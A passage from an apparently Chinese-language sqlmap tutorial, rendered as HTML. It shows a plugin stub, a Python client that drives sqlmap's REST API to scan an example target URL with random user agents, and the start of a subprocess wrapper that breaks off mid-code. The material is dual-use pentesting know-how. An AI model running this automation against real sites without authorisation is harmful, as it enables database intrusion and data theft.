<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        return</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> False</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> getFingerprint</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(self):</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        &quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        获取数据库指纹</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        &quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        return</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;Custom Database Fingerprint&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> customAction</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(self):</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        &quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        自定义操作</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        &quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        logger.info(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;执行自定义操作&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 实现具体逻辑</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        pass</span></span></code></pre></figure>
<h4 id="api接口使用">API接口使用<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#api接口使用" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="python" data-theme="github-light github-dark"><code data-language="python" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#!/usr/bin/env python</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># sqlmap_api_client.py - SQLMap API客户端示例</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> requests</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> json</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> time</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">class</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> SQLMapAPI</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    def</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> __init__</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(self, host</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'127.0.0.1'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, port</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">8775</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">):</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        self</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.base_url </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;http://</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">host</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">port</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        self</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.task_id </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> None</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> create_task</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(self):</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        &quot;&quot;&quot;创建新任务&quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        url </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{self</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.base_url</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/task/new&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        response </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> requests.get(url)</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        self</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.task_id </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> response.json()[</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'taskid'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;任务ID: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{self</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.task_id</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        return</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> self</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.task_id</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> start_scan</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(self, target_url):</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        &quot;&quot;&quot;开始扫描&quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        url </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{self</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.base_url</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/scan/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{self</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.task_id</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/start&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        data </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">            'url'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: target_url,</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">            'batch'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">True</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">            'randomAgent'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">True</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        }</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        response </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> requests.post(url, </span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">json</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">data)</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> response.json()</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> get_status</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(self):</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        &quot;&quot;&quot;获取扫描状态&quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        url </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{self</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.base_url</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/scan/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{self</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.task_id</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/status&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        response </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> requests.get(url)</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> response.json()[</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'status'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> get_data</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(self):</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        &quot;&quot;&quot;获取扫描结果&quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        url </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{self</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.base_url</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/scan/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{self</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.task_id</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/data&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        response </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> requests.get(url)</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> response.json()</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> delete_task</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(self):</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        &quot;&quot;&quot;删除任务&quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        url </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{self</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.base_url</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/task/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{self</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.task_id</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/delete&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        response </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> requests.get(url)</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> response.json()</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用示例</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">if</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> __name__</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> ==</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> '__main__'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 启动SQLMap API服务器</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # sqlmap --api -s</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    api </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> SQLMapAPI()</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 创建任务</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    api.create_task()</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 开始扫描</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    target </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;http://example.com/page.php?id=1&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    api.start_scan(target)</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 轮询状态</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    while</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> True</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        status </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> api.get_status()</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;扫描状态: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">status</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        if</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> status </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">==</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 'terminated'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            break</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        time.sleep(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">5</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 获取结果</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    data </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> api.get_data()</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">    print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(json.dumps(data, </span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">indent</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">2</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">))</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 删除任务</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    api.delete_task()</span></span></code></pre></figure>
<h4 id="二次开发集成">二次开发集成<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#二次开发集成" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="python" data-theme="github-light github-dark"><code data-language="python" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#!/usr/bin/env python</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># sqlmap_integration.py - SQLMap集成到自定义工具</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> subprocess</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> json</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> os</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">class</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> SQLMapWrapper</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &quot;&quot;&quot;SQLMap包装类&quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    def</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> __init__</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(self, sqlmap_path</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'sqlmap'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">):</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">        self</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.sqlmap_path </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> sqlmap_path</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> scan</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(self, url, </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">**</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">options):</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        &quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        执行SQL扫描</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        </span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        参数:</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">            url: 目标URL</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">            **options: SQLMap选项</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        </span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        返回:</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">            扫描结果字典</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        &quot;&quot;&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        cmd </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">self</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.sqlmap_path, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'-u'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, url, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'--batch'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 添加选项</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        for</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> key, value </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">in</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> options.items():</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            if</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> value </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">is</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> True</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">                cmd.append(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">f</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'--</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">key</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            elif</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> value </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">is</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> not</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> False</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">:</span></span>
